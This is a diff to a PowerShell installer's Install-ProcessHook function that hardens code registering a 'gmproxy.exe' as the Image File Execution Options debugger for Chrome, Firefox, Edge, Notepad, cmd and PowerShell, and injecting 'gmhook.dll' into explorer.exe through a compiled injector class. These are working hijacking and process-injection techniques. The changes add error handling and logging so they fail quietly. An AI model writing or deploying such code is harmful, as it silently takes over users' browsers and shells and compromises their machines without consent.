@@ -3753,6 +3753,8 @@ function Install-ProcessHook {
                         $BuildOutput = & $ShellExe -NoProfile -ExecutionPolicy Bypass -File "$BuildScript" 2>&1
                         $BuildOutput | Out-File -FilePath $BuildLog -Encoding UTF8 -Force
                         $BuildExit = $LASTEXITCODE
+                        # Small pause to ensure filesystem is consistent before Test-Path checks
+                        Start-Sleep -Milliseconds 250
                         if ($BuildExit -ne 0) {
                             Write-Log -Message "Auto-build failed (exit $BuildExit). Full log: $BuildLog" -Type "ERROR" -Color Red
                             Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "Auto-build failed exit=$BuildExit"
@@ -3792,33 +3794,39 @@ function Install-ProcessHook {
             return
         }
 
+        # Ensure install directory exists before copying binaries
+        if (-not (Test-Path $GodModeInstallDir)) { New-Item -ItemType Directory -Path $GodModeInstallDir -Force | Out-Null }
+
         if (-not (Test-Path $ProxyExe)) {
             Write-Log -Message "gmproxy.exe still missing after build attempt. Skipping IFEO proxy install." -Type "WARN" -Color Yellow
             Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "gmproxy.exe still missing after build"
         } else {
             $destProxy = Join-Path $GodModeInstallDir "gmproxy.exe"
-            Copy-Item -Path $ProxyExe -Destination $destProxy -Force -ErrorAction SilentlyContinue
+            try { Copy-Item -Path $ProxyExe -Destination $destProxy -Force -ErrorAction SilentlyContinue } catch { Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Copy-Item gmproxy.exe failed: $_" }
             Write-Log -Message "gmproxy.exe installed to $destProxy" -Type "INFO" -Color Gray
 
             # Register IFEO Debugger for user-mode apps (not taskmgr or explorer)
             $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
             $TargetApps = @("chrome.exe", "firefox.exe", "msedge.exe", "notepad.exe", "cmd.exe", "powershell.exe")
             foreach ($app in $TargetApps) {
-                $appPath = Join-Path $IfeoPath $app
-                if (-not (Test-Path $appPath)) { New-Item -Path $appPath -Force | Out-Null }
-                Set-ItemProperty -Path $appPath -Name "Debugger" -Value "`"$destProxy`"" -Force -ErrorAction SilentlyContinue
+                try {
+                    $appPath = Join-Path $IfeoPath $app
+                    if (-not (Test-Path $appPath)) { New-Item -Path $appPath -Force | Out-Null }
+                    Set-ItemProperty -Path $appPath -Name "Debugger" -Value "`"$destProxy`"" -Force -ErrorAction SilentlyContinue
+                } catch { Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "IFEO registration for $app failed: $_" }
             }
-        Write-Log -Message "IFEO proxy registered for: $($TargetApps -join ', ')" -Type "INFO" -Color Gray
+            Write-Log -Message "IFEO proxy registered for: $($TargetApps -join ', ')" -Type "INFO" -Color Gray
         }
 
         $success = $true
+        Write-DebugLog -FunctionName "Install-ProcessHook" -Action "INFO" -Message "Build+IFEO succeeded. success=$success"
 
         if (-not (Test-Path $HookDll)) {
             Write-Log -Message "gmhook.dll still missing after build attempt. Skipping DLL injection." -Type "WARN" -Color Yellow
             Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "gmhook.dll still missing after build"
         } else {
             $destHook = Join-Path $GodModeInstallDir "gmhook.dll"
-            Copy-Item -Path $HookDll -Destination $destHook -Force -ErrorAction SilentlyContinue
+            try { Copy-Item -Path $HookDll -Destination $destHook -Force -ErrorAction SilentlyContinue } catch { Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Copy-Item gmhook.dll failed: $_" }
             Write-Log -Message "gmhook.dll installed to $destHook" -Type "INFO" -Color Gray
 
             # Inject into explorer.exe using a simple PowerShell injector
@@ -3876,15 +3884,18 @@ public class GmInjector {
 }
 "@
                 try {
-                    Add-Type -TypeDefinition $InjectorType -ErrorAction Stop | Out-Null
+                    if (-not ([System.Management.Automation.PSTypeName]'GmInjector').Type) {
+                        Add-Type -TypeDefinition $InjectorType -ErrorAction SilentlyContinue | Out-Null
+                    }
                     $rc = [GmInjector]::Inject($explorer.Id, $destHook)
                     if ($rc) {
                         Write-Log -Message "gmhook.dll injected into explorer PID=$($explorer.Id)" -Type "INFO" -Color Green
                     } else {
-                        Write-Log -Message "gmhook.dll injection into explorer failed ( insufficient privileges or access denied)." -Type "WARN" -Color Yellow
+                        Write-Log -Message "gmhook.dll injection into explorer failed (insufficient privileges or access denied)." -Type "WARN" -Color Yellow
                     }
                 } catch {
                     Write-Log -Message "GmInjector compilation/injection failed: $_" -Type "WARN" -Color Yellow
+                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "GmInjector failed: $_"
                 }
             } else {
                 Write-Log -Message "explorer.exe not found; skipping DLL injection." -Type "WARN" -Color Yellow
@@ -3892,6 +3903,7 @@ public class GmInjector {
         }
     } catch {
         Write-Log -Message "Install-ProcessHook failed: $_" -Type "WARN" -Color Yellow
+        Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "Outer catch: $_"
         $success = $false
     }
     Write-DebugLog -FunctionName "Install-ProcessHook" -Action "EXIT" -Message "Success=$success"
